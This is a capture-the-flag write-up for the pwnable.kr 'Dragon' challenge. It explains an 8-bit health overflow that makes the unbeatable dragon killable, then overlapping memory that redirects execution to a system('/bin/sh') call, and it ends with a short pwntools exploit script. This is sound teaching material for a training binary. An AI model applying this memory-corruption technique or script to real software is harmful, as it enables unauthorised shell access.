---
layout: post
title: Pwnable/Dragon
date: 2026-03-20 22:47 +0530
categories: [Writeup,Pwn, Pwnable.kr]
---


>I made a RPG game for my little brother.
But to trick him, I made it impossible to win.
I hope he doesn't get too angry with me :P!
>
Author : rookiss
>
ssh dragon@pwnable.kr -p2222 (pw: guest)

### Analysis

We are given a game where we have to somehow slay the dragon.

After reversing the code, I found some few perculiar things 🤔.

#### 1. The Secret level 🤫

![Desktop View](assets/img/pwnable/dragon-secret-level.png){: width="500" height="200" }

It asks for a string of length 10 but compares that same string with a given string of length 39. Seems impossible right??

#### 2. The fight with Dragon

![Desktop View](assets/img/pwnable/dragon-unfair-fight.png){: width="700" height="400" }

It seems that no matter how many times one tries, they are unable to defeat the dragon

#### 3. Going down in history

![Desktop View](assets/img/pwnable/dragon-after-winning.png){: width="500" height="300" }

We can see here that the 16 bytes of v5 will be overlapping with v4, thus we can think about putting some address there for execution.

So we have to somehow bring the program execution till this phase to perform an attack. But beating the dragon is impossible right? Well not quite. We can see that only one byte of the health is being used to check whether the dragon is dead or not.
So that means that if that one byte is overflowed, we can technically kill the dragon and thats what we do. (Notice that the mother dragon's HP is closest to be overflowed)

![Desktop View](assets/img/pwnable/dragon-byte-overflow.png){: width="500" height="300" }

The rest is easy, just overwrite the address after the dragon name to the address of the secret level ( specifically the address where system("/bin/sh") occurs)

### Exploit

```python
import pwn
from pwn import *

context.terminal=["tmux","splitw","-h"]

p=process("./dragon")
#gdb.attach(p)
#pause()

p.sendline(b"1") # Choosing priest

p.sendline(b"1") # Killing priest by baby dragon
p.sendline(b"1")

p.sendline(b"1") # Choosing priest again

for i in range(0,4):
    p.sendline(b"3")
    p.sendline(b"3")
    p.sendline(b"2")

p.sendline(p32(0x8048DBF))

p.interactive()
```

### Output

![Desktop View](assets/img/pwnable/dragon-output.png){: width="600" height="300" }